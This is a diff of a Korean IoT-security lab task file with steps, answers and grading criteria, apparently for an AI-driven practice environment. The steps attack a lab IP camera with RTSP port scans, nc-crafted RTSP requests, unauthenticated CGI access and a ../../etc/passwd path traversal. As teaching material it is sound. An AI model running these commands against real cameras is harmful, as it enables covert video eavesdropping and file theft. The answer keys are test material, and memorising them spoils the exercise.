@@ -26,21 +26,22 @@ steps:
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w9 s1 — 대상 서버의 RTSP 포트(554, 8554)를 스캔하시오. (cmd: nmap -sV -p 554,8554 10.20.30.80 2>/dev/null && echo
-        ''RTSP 스캔 완료'')'
+      intent: RTSP IP 카메라 포트 스캔 — nmap -sV -p 554,8554 10.20.30.80 으로 표준(554) 및 대체(8554) RTSP 포트 서비스 버전
+        감지. RTSP (Real-Time Streaming Protocol, RFC 2326) 는 IP 카메라/NVR 의 실시간 영상 스트림 프로토콜로 미인증 시 영상 도청
+        가능.
       success_criteria:
-      - '명령 실행: nmap -sV -p 554,8554 10.20.30.80 2>/dev/null && echo ''RTSP 스'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - nmap -sV 버전 감지 활성화
+      - -p 554,8554 두 RTSP 포트 동시 스캔
+      - GStreamer/Live555 등 RTSP 서버 식별
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - nmap -sV -p 554,8554
+      - nmap --script rtsp-url-brute 로 URL 무차별 대입
+      - ffprobe rtsp://<host>/ 로 스트림 검증
+      - Shodan rtsp 태그 검색으로 노출 카메라 탐지
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - -sV 없이 포트 오픈만
+      - 554 또는 8554 중 하나만 스캔
+      - RTSP 프로토콜의 영상 도청 위협 맥락 누락
   target_vm: attacker
   script: nmap -sV -p 554,8554 10.20.30.80 2>/dev/null && echo 'RTSP 스캔 완료'
   risk_level: low
@@ -50,32 +51,34 @@ steps:
   hint: echo "OPTIONS rtsp://host/live RTSP/1.0\r\nCSeq:1\r\n" | nc 명령을 사용하세요.
   category: rtsp
   points: 10
-  answer: "\U0001F916 프롬프트: RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인해줘\n\U0001F4CE 참고 (CLI): printf 'OPTIONS rtsp://10.20.30.80:8554/live\
-    \ RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80 8554 2>/dev/null; echo 'RTSP OPTIONS 완료'"
+  answer: "\U0001F916 프롬프트: RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인해줘\n\U0001F4CE 참고 (CLI): printf 'OPTIONS\
+    \ rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80 8554 2>/dev/null;\
+    \ echo 'RTSP OPTIONS 완료'"
   answer_detail: OPTIONS 메서드로 RTSP 서버가 지원하는 기능(DESCRIBE, SETUP, PLAY 등)을 확인합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: "IoT 보안 w9 s2 — RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인하시오. (cmd: printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\
-        \ CSeq: 1\r \r ' | nc -w 3 10)"
+      intent: 'RTSP OPTIONS 메서드 탐색 — printf OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n
+        | nc -w 3 10.20.30.80 8554 으로 OPTIONS 요청 전송하여 서버 지원 메서드(DESCRIBE/SETUP/PLAY/PAUSE/TEARDOWN) 확인.
+        Public 헤더로 응답.'
       success_criteria:
-      - "명령 실행: printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r CSeq:"
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - printf 로 RTSP 1.0 OPTIONS 요청 수동 구성
+      - 'CSeq: 1 헤더 포함 + CRLF(\r\n) 개행 + 빈 줄로 헤더 종료'
+      - nc -w 3 으로 3초 timeout 후 응답 확인
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - printf + nc 수동 요청
+      - curl -v rtsp://<host>:<port>/<path>
+      - ffmpeg -rtsp_transport tcp -i rtsp://<url>
+      - VLC open network stream 대화형
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - CRLF 대신 LF 만 사용 (RTSP 파싱 실패)
+      - CSeq 헤더 누락
+      - RTSP 메서드 열거 목적 맥락 없음
   target_vm: attacker
-  script: "printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80 8554 2>/dev/null;\
-    \ echo 'RTSP OPTIONS 완료'"
+  script: "printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80\
+    \ 8554 2>/dev/null; echo 'RTSP OPTIONS 완료'"
   risk_level: low
   bastion_prompt: RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인해줘
 - order: 3
@@ -85,32 +88,33 @@ steps:
   points: 12
   answer: '🤖 프롬프트: 일반적인 RTSP 경로(/live, /h264, /stream, /Streaming/Channels/101)를 테스트해줘
 
-    📎 참고 (CLI): for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq: 1\r\n\r\n"
-    | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
+    📎 참고 (CLI): for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq:
+    1\r\n\r\n" | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
   answer_detail: IP 카메라 제조사마다 서로 다른 RTSP 경로를 사용합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w9 s3 — 일반적인 RTSP 경로(/live, /h264, /stream, /Streaming/Channels/101)를 테스트하시오. (cmd: for path in /live
-        /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$pat)'
+      intent: 'RTSP 경로 무차별 탐색 — for path in /live /h264 /stream; do printf DESCRIBE rtsp://10.20.30.80:8554$path
+        RTSP/1.0\r\nCSeq: 1\r\n\r\n | nc -w 2 | head -1; done 루프로 3개 일반 경로 순회. 제조사별 경로 상이: Hikvision(/Streaming/Channels/101),
+        Dahua(/cam/realmonitor), 일반(/live/h264/stream).'
       success_criteria:
-      - '명령 실행: for path in /live /h264 /stream; do printf "DESCRIBE rtsp://'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - for 루프로 3개 일반 RTSP 경로 순회
+      - 각 경로로 DESCRIBE 요청 전송
+      - head -1 로 첫 번째 응답 라인(RTSP/1.0 200 OK or 404 Not Found) 확인
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - for + printf + nc 조합
+      - rtsp-url-brute NSE 스크립트
+      - cameradar RTSP 공격 도구 (wordlist 기반)
+      - Shodan RTSP 경로 데이터베이스
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 3개 경로 중 일부만 시도
+      - head -1 없이 전체 응답 덤프
+      - 제조사별 경로 차이 맥락 누락
   target_vm: attacker
-  script: 'for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq: 1\r\n\r\n"
-    | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
+  script: 'for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq:
+    1\r\n\r\n" | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
   risk_level: low
   bastion_prompt: 일반적인 RTSP 경로(/live, /h264, /stream, /Streaming/Channels/101)를 테스트해줘
 - order: 4
@@ -120,28 +124,29 @@ steps:
   points: 12
   answer: '🤖 프롬프트: 카메라 웹 인터페이스(8089)의 CGI 경로에 미인증으로 접근해줘
 
-    📎 참고 (CLI): curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5; echo ''CGI 접근 테스트 완료'''
+    📎 참고 (CLI): curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5; echo ''CGI 접근
+    테스트 완료'''
   answer_detail: 인증 없이 CGI에 직접 접근할 수 있으면 카메라 설정 정보가 노출됩니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w9 s4 — 카메라 웹 인터페이스(8089)의 CGI 경로에 미인증으로 접근하시오. (cmd: curl -s http://10.20.30.80:8089/cgi-bin/config.cgi
-        2>/dev/null | head -5; echo '')'
+      intent: 카메라 웹 관리자 CGI 미인증 접근 — curl -s http://10.20.30.80:8089/cgi-bin/config.cgi | head -5 으로 /cgi-bin/config.cgi
+        엔드포인트에 인증 없이 접근하여 설정 응답 상위 5줄 확인. CVE-2017-7921 Hikvision backdoor 등 실제 IP 카메라 CGI 취약점 유형.
       success_criteria:
-      - '명령 실행: curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/nu'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - curl -s 익명 GET 요청으로 /cgi-bin/config.cgi 접근
+      - head -5 로 응답 상위 5줄 확인
+      - 인증 없이 설정 정보 반환 시 취약점 확인
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - curl -s + head
+      - wfuzz -c -z file,cgi-list /cgi-bin/FUZZ 로 CGI 엔드포인트 무차별 검색
+      - nikto -h http://<target>:8089 로 CGI 취약점 스캔
+      - Burp Suite Pro 로 active scan
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - Authorization 헤더 포함
+      - head 없이 전체 덤프
+      - CVE-2017-7921 등 실제 사례 맥락 누락
   target_vm: attacker
   script: curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5; echo 'CGI 접근 테스트 완료'
   risk_level: low
@@ -153,32 +158,33 @@ steps:
   points: 12
   answer: '🤖 프롬프트: 경로 탐색 공격으로 서버의 /etc/passwd 파일을 읽으시오해줘
 
-    📎 참고 (CLI): curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null | head -5; echo ''경로
-    탐색 테스트 완료'''
+    📎 참고 (CLI): curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null
+    | head -5; echo ''경로 탐색 테스트 완료'''
   answer_detail: 경로 탐색(Path Traversal) 취약점으로 서버의 임의 파일을 읽을 수 있습니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w9 s5 — 경로 탐색 공격으로 서버의 /etc/passwd 파일을 읽으시오. (cmd: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd"
-        2>/)'
+      intent: Path Traversal 취약점 (CWE-22) — curl -s http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd
+        으로 file 파라미터에 ../../ 상대 경로 주입하여 /etc/passwd 등 루트 파일 접근. OWASP Top 10 A01:2021 Broken Access Control
+        + MITRE T1083 (File and Directory Discovery).
       success_criteria:
-      - '명령 실행: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=.'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - curl 쿼리 파라미터에 ../../ path traversal 시퀀스 주입
+      - /etc/passwd 타겟 파일로 리눅스 계정 정보 탈취 시도
+      - head -5 으로 응답 확인하여 root:x:0:0 등 파싱
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - curl + ../../ 수동 페이로드
+      - dotdotpwn 자동 path traversal fuzzing 도구
+      - wfuzz -z file,traversal-wordlist
+      - Burp Suite Intruder 로 인코딩 변형 테스트
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - ../../ 대신 ../ 또는 / 만 사용
+      - /etc/passwd 대신 상대 경로 무의미 탐색
+      - CWE-22/OWASP A01 매핑 없음
   target_vm: attacker
-  script: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null | head -5; echo '경로 탐색
-    테스트 완료'
+  script: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null | head
+    -5; echo '경로 탐색 테스트 완료'
   risk_level: low
   bastion_prompt: 경로 탐색 공격으로 서버의 /etc/passwd 파일을 읽으시오해줘
 - order: 6
@@ -188,31 +194,33 @@ steps:
   points: 10
   answer: '🤖 프롬프트: IP 카메라 보안 점검 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== IP 카메라 보안 보고서 ==='' && echo ''[Critical] CGI 미인증 접근 → 설정 노출'' && echo ''[High] 경로 탐색 → 파일 읽기''
-    && echo ''[High] RTSP 미인증 → 영상 도청'' && echo ''[권장] RTSP Digest 인증, CGI 인증, 입력 검증'' && echo ''=== 보고서 완료 ==='''
+    📎 참고 (CLI): echo ''=== IP 카메라 보안 보고서 ==='' && echo ''[Critical] CGI 미인증 접근 → 설정 노출'' && echo ''[High]
+    경로 탐색 → 파일 읽기'' && echo ''[High] RTSP 미인증 → 영상 도청'' && echo ''[권장] RTSP Digest 인증, CGI 인증, 입력 검증''
+    && echo ''=== 보고서 완료 ==='''
   answer_detail: IP 카메라는 물리적 보안과 직결되므로 취약점 패치가 시급합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w9 s6 — IP 카메라 보안 점검 보고서를 작성하시오. (cmd: echo ''=== IP 카메라 보안 보고서 ==='' && echo ''[Critical] CGI 미인증 접근
-        → 설정 노출'' && echo ''[H)'
+      intent: 'IP 카메라 보안 점검 보고서 — echo 으로 3 취약점 + 1 권고: [Critical] CGI 미인증 접근 → 설정 노출 + [High] 경로 탐색 →
+        파일 읽기 + [High] RTSP 미인증 → 영상 도청 + [권장] RTSP Digest 인증, CGI 인증, 입력 검증. 프라이버시/물리적 감시 위험 강조.'
       success_criteria:
-      - '명령 실행: echo ''=== IP 카메라 보안 보고서 ==='' && echo ''[Critical] CGI 미인증 접근 '
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - echo === IP 카메라 보안 보고서 === 마커
+      - Critical 1건 + High 2건 + 권장 1건 구조
+      - RTSP Digest 인증, CGI 인증, 입력 검증 3가지 대책
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - echo 평면 출력
+      - markdown report 파일 저장
+      - OWASP IoT Top 10 매핑표 포함
+      - NIST SP 800-213 IoT 보안 기준 참조
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 3 취약점 중 일부 누락
+      - 프라이버시 영향 언급 없음
+      - RTSP Basic vs Digest 인증 차이 맥락 없음
   target_vm: attacker
-  script: echo '=== IP 카메라 보안 보고서 ===' && echo '[Critical] CGI 미인증 접근 → 설정 노출' && echo '[High] 경로 탐색 → 파일 읽기' && echo '[High]
-    RTSP 미인증 → 영상 도청' && echo '[권장] RTSP Digest 인증, CGI 인증, 입력 검증' && echo '=== 보고서 완료 ==='
+  script: echo '=== IP 카메라 보안 보고서 ===' && echo '[Critical] CGI 미인증 접근 → 설정 노출' && echo '[High] 경로 탐색 →
+    파일 읽기' && echo '[High] RTSP 미인증 → 영상 도청' && echo '[권장] RTSP Digest 인증, CGI 인증, 입력 검증' && echo '===
+    보고서 완료 ==='
   risk_level: low
   bastion_prompt: IP 카메라 보안 점검 보고서를 작성하시오.
